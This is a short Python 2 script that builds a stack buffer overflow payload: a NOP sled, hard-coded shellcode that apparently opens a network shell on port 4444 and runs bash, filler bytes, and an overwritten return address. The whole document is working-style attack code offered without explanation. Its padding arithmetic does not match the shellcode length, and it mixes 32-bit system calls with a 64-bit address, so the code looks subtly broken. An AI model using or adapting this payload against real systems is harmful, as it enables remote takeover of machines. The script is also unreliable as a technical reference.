#!/usr/bin/python 

nopsled = '\x90' * 64 
shellcode = ('\x31\xc0\x31\xdb\x31\xff\x31\xf6\xb0\x29\xb3\x01\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x02\xb3\x01\xb1\x02\xb2\x10\x89\xe6\x29\xd4\x89\x34\x24\x31\xc0\x66\xb8\x11\x5c\x50\x66\xb8\x02\x00\x89\xe2\x31\xd0\x31\x52\x31\xc0\x31\xf6\xb0\x2a\xb3\x03\x89\xf1\xb2\x10\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\xb0\x3f\xb3\x04\xb1\x00\xcd\x80\xb3\x01\xb1\x01\xcd\x80\xb3\x02\xb1\x02\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\xb0\x0b\x50\xbb\x62\x61\x73\x68\x53\x89\xe1\x31\xd2\xcd\x80')
padding = 'A' * (112 - 64 - 32)
rip = '\xc0\xdc\xff\xff\xff\x7f'
print nopsled + shellcode + padding + rip
